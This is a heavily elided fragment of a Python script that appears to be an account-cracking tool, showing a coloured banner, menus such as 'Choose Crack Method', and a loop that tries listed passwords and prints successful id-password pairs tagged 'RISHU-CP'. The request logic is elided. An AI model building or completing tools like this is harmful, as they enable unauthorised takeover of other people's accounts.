...
\x1b[1;92m   88oobY' 88    88 `8bo.   88ooo88 88    88 
\x1b[1;92m   88`8b   88    88   `Y8b. 88~~~88 88    88 
...
def menu():
  ...
  print("\033[0;96m─────────────────────────────────────────────────────────────")
  print("\033[0;97m    [ Select Options ]")
...
def methode():
  ...
  banner()
  print ("\033[0;96m─────────────────────────────────────────────────────────────")
  print("\033[0;92m        [ Choose Crack Method ]")
...
def logs():
  banner()
  print("\033[0;96m─────────────────────────────────────────────────────────────")
  print("\033[0;92m          [ Pilih Metode Login ]")
		...
		try:
			for i in fl.get("pw"):
				...
				if log.get("status")=="success":
					...
					print("\r   \033[0;91m[RISHU-CP]%s %s • %s %s     \033[0;90m "%(O,fl.get("id"),i,N))
